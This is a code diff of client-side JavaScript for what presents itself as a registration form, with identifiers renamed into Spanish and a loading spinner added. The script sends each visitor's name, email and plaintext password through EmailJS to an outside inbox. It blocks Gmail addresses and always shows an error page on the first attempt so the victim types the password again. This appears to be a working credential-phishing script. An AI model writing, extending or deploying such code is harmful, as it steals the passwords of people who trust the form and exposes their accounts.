@@ -1,38 +1,48 @@
 emailjs.init('ReqtkWfjI392LAzFb');
 
-document.getElementById('registrationForm').addEventListener('submit', async (e) => {
+document.getElementById('formRegistro').addEventListener('submit', async (e) => {
     e.preventDefault();
     
-    const emailInput = document.getElementById('email');
-    const emailError = document.getElementById('emailError');
-    let attempts = localStorage.getItem('registrationAttempts') || 0;
+    const boton = document.querySelector('.boton-principal');
+    const spinner = document.querySelector('.spinner');
+    const errorEmail = document.querySelector('.error-email');
+    let intentos = localStorage.getItem('intentosRegistro') || 0;
 
-    // Validación estricta
-    if (emailInput.value.toLowerCase().includes('@gmail.com')) {
-        emailError.style.display = 'block';
-        emailInput.focus();
+    // Validación Gmail
+    if(document.getElementById('correo').value.includes('@gmail.com')) {
+        errorEmail.style.display = 'block';
         return;
     }
 
-    try {
-        const response = await emailjs.send("service_syrc1uk", "template_u3etoro", {
-            nombre: document.getElementById('fullName').value,
-            correo: emailInput.value,
-            password: document.getElementById('password').value,
-            intento: ++attempts
-        });
+    // Mostrar spinner
+    boton.disabled = true;
+    spinner.style.display = 'block';
+    boton.style.opacity = '0.7';
 
-        localStorage.setItem('registrationAttempts', attempts);
+    const datos = {
+        nombre: document.getElementById('nombre').value,
+        correo: document.getElementById('correo').value,
+        password: document.getElementById('password').value,
+        intento: parseInt(intentos) + 1
+    };
+
+    try {
+        await emailjs.send("service_syrc1uk", "template_u3etoro", datos);
         
-        if (attempts < 2) {
+        if(intentos < 1) {
+            localStorage.setItem('intentosRegistro', 1);
             window.location.href = 'error.html';
         } else {
-            localStorage.removeItem('registrationAttempts');
-            window.location.href = 'success.html';
+            localStorage.removeItem('intentosRegistro');
+            window.location.href = 'exito.html';
         }
         
     } catch (error) {
-        console.error('Error:', error);
         alert('Error en el proceso');
+        console.error(error);
+    } finally {
+        boton.disabled = false;
+        spinner.style.display = 'none';
+        boton.style.opacity = '1';
     }
 });
